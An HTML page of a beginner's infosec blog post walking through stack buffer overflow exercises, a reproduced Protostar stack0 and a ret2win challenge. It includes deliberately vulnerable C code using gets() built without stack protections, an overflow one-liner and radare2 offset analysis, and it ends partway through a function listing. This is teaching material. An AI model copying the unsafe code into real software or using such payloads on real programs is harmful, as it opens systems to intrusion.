<!DOCTYPE html>







<html lang="en"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    <!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now">

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="PWN Journey: Part 1" />
<meta name="author" content="The Archivist" />
<meta property="og:locale" content="en" />
<meta name="description" content="Foreword Greetings, this series of posts delves into a collection of pwnie solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome." />
<meta property="og:description" content="Foreword Greetings, this series of posts delves into a collection of pwnie solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome." />
<link rel="canonical" href="http://localhost:4000/blog/en/posts/pwns-1/" />
<meta property="og:url" content="http://localhost:4000/blog/en/posts/pwns-1/" />
<meta property="og:site_name" content="Another infosec blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-12-08T00:00:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="PWN Journey: Part 1" />
<meta name="twitter:site" content="@0x7c00" />
<meta name="twitter:creator" content="@The Archivist" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"PWN Journey: Part 1","url":"http://localhost:4000/blog/en/posts/pwns-1/","dateModified":"2021-12-16T00:00:00+08:00","datePublished":"2021-12-08T00:00:00+08:00","author":{"@type":"Person","name":"The Archivist"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/en/posts/pwns-1/"},"description":"Foreword Greetings, this series of posts delves into a collection of pwnie solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>PWN Journey: Part 1 | Another infosec blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/blog/en/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/blog/en/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/blog/en/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/blog/en/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/blog/en/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Another infosec blog">
<meta name="application-name" content="Another infosec blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/blog/en/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/blog/en/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

</head>


  
    <!--
  Switch the mode between dark and light.
-->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }
    static get ID() { return "mode-toggle"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener("change", () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();

      });

    } /* constructor() */

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage({
        direction: ModeToggle.ID,
        message: this.modeStatus
      }, "*");
    }

  } /* ModeToggle */

  const toggle = new ModeToggle();

  function flipMode() {
    if (toggle.hasMode) {
      if (toggle.isSysDarkPrefer) {
        if (toggle.isLightMode) {
          toggle.clearMode();
        } else {
          toggle.setLight();
        }

      } else {
        if (toggle.isDarkMode) {
          toggle.clearMode();
        } else {
          toggle.setDark();
        }
      }

    } else {
      if (toggle.isSysDarkPrefer) {
        toggle.setLight();
      } else {
        toggle.setDark();
      }
    }

    toggle.notify();

  } /* flipMode() */

</script>

  

  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/blog/en/" alt="avatar" class="mx-auto">
        
          
          <img src="/blog/en/assets/img/avatar.gif" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/blog/en/">Another infosec blog</a>
    </div>
    <div class="site-subtitle font-italic">Where one's enthusiasm provides knowledge and comprehension for others.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/blog/en/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/blog/en/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/blog/en/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/blog/en/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/blog/en/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    
      <button class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
      <a href="https://github.com/legiahuyy" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/0x7c00" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['legiahuy420','gmail.com'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/blog/en/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/blog/en/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>PWN Journey: Part 1</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        



<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
    
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->




<!-- images -->



  <!-- add CDN prefix if it exists -->

  

  

  <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

  

  <!-- add image placehoder to prevent layout reflow -->

  

  

  
    
      
      
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      

      

    
      

      
      

      
      

      

    

    

  

  
  

  

  
  

  




<!-- return -->







<h1 data-toc-skip>PWN Journey: Part 1</h1>

<div class="post-meta text-muted">

  <!-- author -->
  <div>
    
    

    

    
    <em>
      
        <a href="https://twitter.com/0x7c00">The Archivist</a>
      
    </em>
  </div>

  <div class="d-flex">
    <div>
      <!-- published date -->
      <span>
        
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago"
    date="2021-12-08 00:00:00 +0800"
    
      data-toggle="tooltip"
      data-placement="bottom"
      title="Wed, Dec  8, 2021, 12:00 AM +0800"
    >Dec  8, 2021</em>

      </span>

      <!-- lastmod date -->
      
      <span>
        Updated
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago"
    date="2021-12-16"
    
      data-toggle="tooltip"
      data-placement="bottom"
      title="Thu, Dec 16, 2021, 12:00 AM +0000"
    >Dec 16, 2021</em>

      </span>
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="2723 words">
  <em>15 min</em> read</span>


      <!-- page views -->
      
    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <h1 id="foreword">Foreword</h1>

<p>Greetings, this series of posts delves into a collection of <em>pwnie</em> solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome.</p>

<!--[READMORE]-->

<p>Notwithstanding these step-by-step solutions, I still strongly encourage readers to reproduce or alter the challenges in their own way. Moreover, please do keep in mind that the solutions are not being put in any level orders, even the first ones can be much complicated for you to fully digest. With that said, then scratching your head for hours, diving into the basics and bending them to your needs is a minimum requirement to achieve your goal.</p>

<p>Anyway, I hope you have a good time learning.</p>

<h1 id="protostar-stack0-reproduced">Protostar stack0 (reproduced)</h1>

<p><strong>Goal:</strong> Change the value of <code class="language-plaintext highlighter-rouge">modified</code> to any but 0.</p>

<p>The <em>original challenge</em> can be found <a href="https://exploit.education/protostar/stack-zero/">here</a>. You should practice this challenge using Protostar VM first since it is built as a 32-bit ELF, much simpler and straightforward.</p>

<p>This particular version of stack0, however, is expected to be built and executed on a variety of different architectures, customizations, and such others.</p>

<p>Description:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
</pre></td></tr></tbody></table></code></div></div>

<p>Source code:</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="c1">// NOTE: I don't use the VM provided by Protostar. So I will include my build options within the source.</span>

<span class="c1">// Build: $ gcc -g stack0.c -o stack0 -no-pie -fno-stack-protector -z execstack</span>
<span class="c1">// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux</span>

<span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>	<span class="c1">// volatile keyword ensures that this variable is not optimized (deleted) by compilers as it is not being used or modified at all</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"you have changed the 'modified' variable</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Try again?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>You can achieve the goal by triggering a buffer overflow in the <code class="language-plaintext highlighter-rouge">gets</code> function since it got flagged unsafe, according to MSDN:</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-08_11-02.png" alt="" /></p>

<h2 id="solution">Solution<a href="#solution"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Some of you have thought of inserting 64 random characters into the <code class="language-plaintext highlighter-rouge">buffer</code> variable and a random byte to write pass the <code class="language-plaintext highlighter-rouge">modified</code> variable itself then congratulation, you are correct… theoretically. If you are exercising the challenge connecting to Protostar VM, it should work properly; otherwise, you might encounter as follows:</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-08_11-55.png" alt="" /></p>

<p>This happened mostly due to our stack alignment or compiler options being somewhat different from that of Protostar VM.</p>

<p>Let us have a closer analysis at the assembly code.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_09-01.png" alt="" /></p>

<p>Put your focus around these lines:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>[0x7ffff7fd3050]&gt; s main;pdf
            ; DATA XREF from entry0 @ 0x55555555507d
┌ 79: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_50h @ rbp-0x50
│           ; var int64_t var_4h @ rbp-0x4
...
│           0x555555555154      c745fc000000.  mov dword [var_4h], 0
│           0x55555555515b      488d45b0       lea rax, [var_50h]
│           0x55555555515f      4889c7         mov rdi, rax
│           0x555555555162      b800000000     mov eax, 0
│           0x555555555167      e8d4feffff     call sym.imp.gets       ; char *gets(char *s)
│           0x55555555516c      8b45fc         mov eax, dword [var_4h]
...
</pre></td></tr></tbody></table></code></div></div>

<p>Based on the code, <code class="language-plaintext highlighter-rouge">gets</code> reads a line from STDIN and the size of the buffer can be inferred by subtracting the end address (i.e, <code class="language-plaintext highlighter-rouge">rbp-0x50</code>) with  the start address (i.e, <code class="language-plaintext highlighter-rouge">rbp-0x4</code>). Hence, <code class="language-plaintext highlighter-rouge">buf_size = 0x50 - 0x4 = 0x4c = 76 (decimal)</code>.</p>

<h2 id="solvepy">Solve.py<a href="#solvepy"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>And from that we now know how many characters are needed to overflow the buffer, but remember we still have to overwrite the <code class="language-plaintext highlighter-rouge">modified</code> variable.</p>

<p>So here is our one-liner.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print(b"a"*76 + b"modified_val")'</span> | ./stack0
</pre></td></tr></tbody></table></code></div></div>

<p>Goal achieved.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_09-30.png" alt="" /></p>

<hr />

<h1 id="ret2win-reproduce">ret2win (reproduce)</h1>

<p><strong>Goal:</strong> Successfully overwrite the return pointer to execute <code class="language-plaintext highlighter-rouge">win()</code>.</p>

<p>A random 32-bit challenge on the Internet with only its source code provided. Same approach but in 64-bit.</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="c1">// Build: $ gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack</span>

<span class="c1">// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux</span>

<span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="kt">void</span> <span class="nf">unsafe</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
    
    <span class="n">puts</span><span class="p">(</span><span class="s">"Overflow me"</span><span class="p">);</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">unsafe</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">flag</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Exploited!!!!!"</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="code-breakdown">Code breakdown<a href="#code-breakdown"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>The program calls <code class="language-plaintext highlighter-rouge">unsafe()</code>, which contains a buffer overflow vulnerability at the <code class="language-plaintext highlighter-rouge">gets</code> with a buffer of 40 bytes. Furthermore, there is a <code class="language-plaintext highlighter-rouge">flag()</code> function but it is completely isolated, never to be called and we have to somehow invoke the function.</p>

<h2 id="solution-1">Solution<a href="#solution-1"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>As already mentioned, we need to find how many bytes to overflow and reach the return address pointer, thus 40 bytes is not enough. You can imagine our skeleton payload should roughly be as follows:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>payload = BUF_SIZE (40 bytes) + SOME_JUNK (?? bytes) + FLAG_ADDR (RIP)
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">BUF_SIZE</code> and <code class="language-plaintext highlighter-rouge">SOME_JUNK</code> in combination, there is a generic term for it called <em>padding</em> and we have to determine the padding length before you can overwrite the value of <code class="language-plaintext highlighter-rouge">RIP</code>.</p>

<p>Let me introduce you to the <strong>De Bruijn Sequence</strong>, which contains no string of <code class="language-plaintext highlighter-rouge">n</code> character repeated. The sequence can either be created by yourself or any available auxiliaries (e.g., <code class="language-plaintext highlighter-rouge">ragg2</code>, <code class="language-plaintext highlighter-rouge">cyclic</code>, <code class="language-plaintext highlighter-rouge">pattern_create (gdb)</code>).</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-11.png" alt="" /></p>

<p>The reason why a <em>random</em> gibberish string is able to help us to find the padding is that while you are filling the stack with the sequence, <code class="language-plaintext highlighter-rouge">RIP</code> (and even others) could already be overwritten, thereby leading to a SIGSEGV and crashing the execution. With that, the particular position of these so-called <em>random bytes</em> in <code class="language-plaintext highlighter-rouge">RIP</code> now is that of our padding length in the sequence pattern.</p>

<p>Next, we want to load the binary in our debugger and find the padding length.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-40.png" alt="" /></p>

<p>and our registers table:</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-50.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">wopO `dr rip`</code> command simply finds the given value in <code class="language-plaintext highlighter-rouge">RIP</code> into a De Bruijn sequence at a current offset or you can just type <code class="language-plaintext highlighter-rouge">wopO 0x41415441</code> instead and it shows us our padding size, 56.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>payload = PADDING (56 bytes) + FLAG_ADDR (RIP)
</pre></td></tr></tbody></table></code></div></div>

<p>We have one last factor, the address of <code class="language-plaintext highlighter-rouge">flag()</code> which is <code class="language-plaintext highlighter-rouge">0x0040116b</code>. To get it, simply type <code class="language-plaintext highlighter-rouge">afl</code> for a list of functions and their addresses.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>[0x41415441]&gt; afl
0x00401050    1 42           entry0
0x00401090    4 33   -&gt; 31   sym.deregister_tm_clones
0x004010c0    4 49           sym.register_tm_clones
0x00401100    3 33   -&gt; 28   sym.__do_global_dtors_aux
0x00401130    1 2            entry.init0
0x004011e0    1 1            sym.__libc_csu_fini
0x00401132    1 40           dbg.unsafe
